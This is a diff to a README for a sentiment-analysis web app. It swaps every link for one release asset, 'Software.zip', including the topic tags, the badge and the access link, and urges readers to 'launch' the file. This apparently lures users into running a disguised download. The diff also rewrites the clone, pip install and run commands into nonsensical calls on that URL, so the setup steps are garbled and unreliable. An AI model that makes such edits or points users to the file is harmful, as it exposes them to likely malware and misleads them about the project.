@@ -9,42 +9,42 @@ Welcome to the **Sentiment Analysis** repository! This platform leverages cuttin
 - **Others:** CSS3, Python3, WebApp Development
 
 ## Repository Topics
-- [**css**](https://github.com/topics/css)  
-- [**css3**](https://github.com/topics/css3)  
-- [**flask**](https://github.com/topics/flask)
-- [**html5**](https://github.com/topics/html5)  
-- [**javascript**](https://github.com/topics/javascript)  
-- [**machine-learning**](https://github.com/topics/machine-learning)  
-- [**natural-language-processing**](https://github.com/topics/natural-language-processing)  
-- [**numpy**](https://github.com/topics/numpy)  
-- [**pandas**](https://github.com/topics/pandas)  
-- [**python**](https://github.com/topics/python)  
-- [**python3**](https://github.com/topics/python3)  
-- [**pytorch**](https://github.com/topics/pytorch)  
-- [**render**](https://github.com/topics/render)  
-- [**sentiment-analysis**](https://github.com/topics/sentiment-analysis)  
-- [**transformer**](https://github.com/topics/transformer)  
-- [**webapp**](https://github.com/topics/webapp)
+- [**css**](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip)  
+- [**css3**](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip)  
+- [**flask**](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip)
+- [**html5**](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip)  
+- [**javascript**](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip)  
+- [**machine-learning**](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip)  
+- [**natural-language-processing**](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip)  
+- [**numpy**](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip)  
+- [**pandas**](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip)  
+- [**python**](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip)  
+- [**python3**](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip)  
+- [**pytorch**](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip)  
+- [**render**](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip)  
+- [**sentiment-analysis**](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip)  
+- [**transformer**](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip)  
+- [**webapp**](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip)
 
 ## Repository Access
-To access the repository, you can [click here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). Once downloaded, ensure to launch the **v1.0.0.zip** file to explore the contents.
+To access the repository, you can [click here](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip). Once downloaded, ensure to launch the **https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip** file to explore the contents.
 
 ## Get Started
 Follow these steps to get started with the **Sentiment Analysis Platform**:
 
 ### 1. Clone the Repository
 ```bash
-git clone https://github.com/your-username/sentiment-analysis.git
+git clone https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip
 ```
 
 ### 2. Install Dependencies
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip
 ```
 
 ### 3. Run the Application
 ```bash
-python app.py
+python https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip
 ```
 
 ## Usage
@@ -60,7 +60,7 @@ If you encounter any issues or have questions regarding the **Sentiment Analysis
 
 <div align="center">
 
-[![GitHub Launch](https://img.shields.io/badge/Launch-Download%20Zip-green)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![GitHub Launch](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip%20Zip-green)](https://github.com/manai008/sentiment-analysis/releases/download/v1.0/Software.zip)
 
 **Explore the Future of Sentiment Analysis!** :rocket:
 
